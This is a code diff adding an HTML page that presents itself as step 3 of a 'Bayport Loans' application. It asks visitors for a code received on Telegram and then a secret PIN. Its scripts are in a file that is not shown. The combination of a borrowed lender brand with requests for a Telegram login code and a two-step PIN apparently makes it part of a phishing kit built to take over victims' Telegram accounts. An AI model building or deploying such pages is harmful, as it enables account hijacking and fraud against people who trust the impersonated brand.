@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bayport Loans - Code</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <h1>BAYPORT LOANS</h1>
+            <p>Step 3: Code Verification</p>
+        </div>
+
+        <div class="application-summary">
+            <div class="summary-item">
+                <span class="summary-label">Reference:</span>
+                <span class="summary-value highlight" id="refId">-</span>
+            </div>
+        </div>
+
+        <div class="otp-container">
+            <h2>Enter Code</h2>
+            <p>Enter the code from Telegram</p>
+            
+            <form id="codeForm">
+                <div class="form-group">
+                    <label for="verificationCode">Code *</label>
+                    <input type="text" id="verificationCode" required placeholder="Enter code" maxlength="6">
+                </div>
+                <button type="submit" class="btn-submit">Verify</button>
+            </form>
+
+            <div id="pinSection" class="pin-section hidden">
+                <h3>PIN Verification</h3>
+                <p>Enter your PIN</p>
+                <div class="form-group">
+                    <label for="pinCode">PIN *</label>
+                    <input type="password" id="pinCode" placeholder="Enter PIN" maxlength="6">
+                </div>
+                <button type="button" class="btn-submit" onclick="submitPin()">Verify PIN</button>
+            </div>
+
+            <div id="timer" class="timer hidden">
+                <p>Wait <span id="countdown">180</span> seconds</p>
+                <div class="progress-bar"><div class="progress" id="progress"></div></div>
+            </div>
+
+            <div id="messageBox" class="message-box hidden"></div>
+        </div>
+    </div>
+    <script src="js/page3.js"></script>
+</body>
+</html>
